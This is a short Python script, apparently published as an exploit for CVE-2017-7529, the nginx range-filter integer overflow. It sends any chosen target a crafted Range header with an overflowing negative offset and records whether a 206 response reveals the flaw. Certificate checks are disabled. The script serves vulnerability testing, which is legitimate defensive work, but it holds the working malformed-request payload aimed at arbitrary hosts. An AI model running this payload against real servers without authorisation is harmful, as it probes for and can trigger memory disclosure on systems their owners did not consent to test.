#!/usr/bin/python
# -*- coding:utf-8 -*-
import argparse
import json
import pathlib
from typing import Final

# Nginx - Remote Integer Overflow Vulnerability
# CVE-2017-7529
# https://github.com/SouravSec
# Instagram: @itninja.official

import requests
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)


def send_http_request(url, headers={}, timeout=8.0):
    httpResponse = requests.get(url, headers=headers, timeout=timeout, verify=False)
    httpHeaders = httpResponse.headers

    # print(httpHeaders.get('Server', ''))
    data["Server"] = httpHeaders.get('Server', '')
    return httpResponse


def exploit(url):
    httpResponse = send_http_request(url)

    content_length = httpResponse.headers.get('Content-Length', 0)
    bytes_length = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)

    httpResponse = send_http_request(url, headers={'Range': content_length})

    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
        data["Is_Vulnerable"] = "CVE-2017-7529"
        # print("Vulnerable to CVE-2017-7529")
    else:
        data["Is_Vulnerable"] = "No Vulnerable"
        # print("No Vulnerable")

    return data


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', type=str, help='Your target url/domain/ip')
    parser.add_argument('--output', type=str, help='filename JSON')

    args = parser.parse_args()

    target = args.target
    output = args.output

    MAIN_DIR: Final[pathlib.Path] = pathlib.Path(__file__).parent
    OUTPUT_FILE: str = MAIN_DIR / output

    data = {}
    try:
        data = exploit(target)
    except Exception as e:
        pass
    if data == {}:
        data = {
            "Error": "Nothing found in Scanginx"
        }
    with open(OUTPUT_FILE, 'w') as jf:
        json.dump(data, jf, indent=2)
    print("----OUTPUT----\n", data)
